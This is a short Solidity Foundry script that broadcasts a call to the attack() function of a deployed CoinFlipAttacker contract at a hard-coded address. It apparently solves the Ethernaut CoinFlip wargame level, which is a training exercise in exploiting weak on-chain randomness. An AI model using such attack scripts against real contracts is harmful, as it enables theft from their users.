// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { CoinFlipAttacker } from "../src/04_CoinFlip/04_CoinFlipAttacker.sol";
import { CoinFlip } from "../src/04_CoinFlip/04_CoinFlip.sol";
import { Script } from "forge-std/Script.sol";

contract Attack is Script {

  address constant COINFLIP_ATTACKER_INSTANCE = 0x5904Ea48B047d32cC6FEBacdCE227F383CB954bC;
  CoinFlipAttacker private attacker = CoinFlipAttacker(COINFLIP_ATTACKER_INSTANCE);
  function run() external {
    vm.startBroadcast();
    attacker.attack();
    vm.stopBroadcast();
  }
}